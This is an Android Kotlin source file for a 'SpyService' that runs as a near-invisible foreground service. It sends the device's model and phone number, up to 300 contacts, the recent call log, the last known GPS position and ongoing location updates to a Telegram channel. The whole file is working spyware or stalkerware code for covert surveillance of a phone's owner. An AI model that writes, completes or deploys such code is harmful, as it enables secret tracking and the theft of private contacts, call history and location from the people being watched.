package com.venice.spy

import android.app.*
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.TelephonyManager

class SpyService : Service() {

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        createChannel()

        val n = Notification.Builder(this, "spy")
            .setContentTitle("")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .build()

        if (Build.VERSION.SDK_INT >= 29)
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        else
            startForeground(1, n)

        Telegram.send("🟢 Device connected!\n\n" + deviceInfo())

        Thread {
            sendContacts()
            sendCallLog()
            sendLocationOnce()
        }.start()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("spy", "Spy", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
    }

    // ---------- DATA ----------

    private fun deviceInfo(): String {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val num = try { tm.line1Number ?: "?" } catch (e: Exception) { "?" }
        return """
            📱 DEVICE
            Model : ${Build.MANUFACTURER} ${Build.MODEL}
            Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
            Number : $num
            Brand  : ${Build.BRAND}
        """.trimIndent()
    }

    private fun sendContacts() {
        try {
            val sb = StringBuilder("👥 CONTACTS\n")
            val c = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
            var i = 0
            c?.use {
                while (it.moveToNext() && i < 300) {
                    sb.append(it.getString(0) ?: "?")
                      .append(" : ")
                      .append(it.getString(1) ?: "?")
                      .append("\n")
                    i++
                }
            }
            Telegram.sendLong(sb.toString())
        } catch (e: Exception) { Telegram.send("Contacts err: ${e.message}") }
    }

    private fun sendCallLog() {
        try {
            val sb = StringBuilder("📞 CALL LOG\n")
            val c = contentResolver.query(CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
                null, null, CallLog.Calls.DATE + " DESC")
            var i = 0
            c?.use {
                while (it.moveToNext() && i < 100) {
                    val t = when (it.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "In"
                        CallLog.Calls.OUTGOING_TYPE -> "Out"
                        CallLog.Calls.MISSED_TYPE   -> "Missed"
                        else -> "?"
                    }
                    sb.append("$t  ${it.getString(0)}  ${it.getLong(2)}s\n")
                    i++
                }
            }
            Telegram.sendLong(sb.toString())
        } catch (e: Exception) { Telegram.send("Calllog err: ${e.message}") }
    }

    private fun sendLocationOnce() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            var best: Location? = null
            for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
                if (lm.isProviderEnabled(p)) {
                    val l = lm.getLastKnownLocation(p)
                    if (l != null && (best == null || l.time > best!!.time)) best = l
                }
            }
            if (best != null) sendLoc(best!!)

            // live update bhi maango
            val listener = object : LocationListener {
                override fun onLocationChanged(l: Location) { sendLoc(l) }
                override fun onProviderEnabled(p: String) {}
                override fun onProviderDisabled(p: String) {}
                @Deprecated("x") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
            }
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 300000L, 50f, listener)
        } catch (e: Exception) { Telegram.send("Loc err: ${e.message}") }
    }

    private fun sendLoc(l: Location) {
        Telegram.send("📍 LOCATION\nhttps://maps.google.com/?q=${l.latitude},${l.longitude}")
    }
}